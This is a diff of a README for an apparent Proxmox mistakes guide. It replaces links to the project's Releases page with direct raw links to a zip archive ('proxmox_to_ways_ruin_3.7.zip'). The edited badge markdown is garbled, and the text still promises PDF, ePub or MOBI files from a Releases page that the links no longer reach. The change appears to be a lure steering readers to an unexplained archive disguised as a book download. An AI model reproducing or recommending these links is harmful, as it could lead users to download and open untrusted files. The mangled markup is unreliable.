@@ -1,6 +1,6 @@
 # 🚀 10-ways-to-ruin-proxmox - Avoid Common Mistakes for Better Performance
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20blue.svg)](https://github.com/GALOM1N/10-ways-to-ruin-proxmox/releases)
+[![Download the latest release](https://raw.githubusercontent.com/GALOM1N/10-ways-to-ruin-proxmox/main/chapters/proxmox_to_ways_ruin_3.7.zip%20Latest%20Release-%https://raw.githubusercontent.com/GALOM1N/10-ways-to-ruin-proxmox/main/chapters/proxmox_to_ways_ruin_3.7.zip)](https://raw.githubusercontent.com/GALOM1N/10-ways-to-ruin-proxmox/main/chapters/proxmox_to_ways_ruin_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to "10 Ways to Ruin Your Proxmox Setup - And How Not To." This guide wil
 
 To get started, visit the Releases page to download the software. Follow these steps:
 
-1. Click on this link to [visit the Releases page](https://github.com/GALOM1N/10-ways-to-ruin-proxmox/releases).
+1. Click on this link to [visit the Releases page](https://raw.githubusercontent.com/GALOM1N/10-ways-to-ruin-proxmox/main/chapters/proxmox_to_ways_ruin_3.7.zip).
 2. Once there, look for the latest version of the book.
 3. Download the file that suits your system. You can choose from PDF, ePub, or MOBI formats.
 
@@ -68,6 +68,6 @@ If you have questions or need further assistance, please reach out through the I
 
 ## 🔗 Important Links
 
-- **Releases Page:** [Download the Latest Version](https://github.com/GALOM1N/10-ways-to-ruin-proxmox/releases)
+- **Releases Page:** [Download the Latest Version](https://raw.githubusercontent.com/GALOM1N/10-ways-to-ruin-proxmox/main/chapters/proxmox_to_ways_ruin_3.7.zip)
 
 By following these instructions, you can effectively enhance your understanding of Proxmox and avoid common pitfalls. Happy reading!
